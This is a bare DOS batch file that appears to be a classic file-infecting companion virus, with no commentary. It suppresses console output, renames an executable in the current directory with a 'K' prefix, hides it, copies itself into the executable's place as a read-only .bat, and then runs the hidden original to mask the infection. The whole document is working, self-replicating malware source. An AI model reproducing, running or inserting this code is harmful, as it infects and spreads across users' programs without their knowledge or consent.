@echo off
ctty nul
for %%f in (*.exe *.com) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% K%A%
if not exist K%A% goto end
attrib +h K%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
set A=
:end
ctty con
@if exist K%0.com K%0.com %1 %2 %3
@if exist K%0.exe K%0.exe %1 %2 %3

